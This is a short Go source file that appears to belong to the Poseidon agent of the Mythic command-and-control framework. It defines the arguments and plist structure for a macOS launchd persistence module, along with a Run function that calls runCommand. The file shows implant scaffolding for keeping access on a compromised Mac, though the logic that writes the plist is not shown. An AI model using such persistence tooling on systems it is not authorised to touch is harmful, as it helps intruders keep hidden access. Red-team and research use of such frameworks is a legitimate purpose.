package persist_launchd

import (

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Label       string   `json:"Label"`
	ProgramArgs []string `json:"args"`
	KeepAlive   bool     `json:"KeepAlive"`
	RunAtLoad   bool     `json:"RunAtLoad"`
	Path        string   `json:"LaunchPath"`
	LocalAgent  bool     `json:"LocalAgent"`
	Remove      bool     `json:"remove"`
}

type launchPlist struct {
	Label            string   `plist:"Label"`
	ProgramArguments []string `plist:"ProgramArguments"`
	RunAtLoad        bool     `plist:"RunAtLoad"`
	KeepAlive        bool     `plist:"KeepAlive"`
}

func Run(task structs.Task) {
	runCommand(task)
	return
}
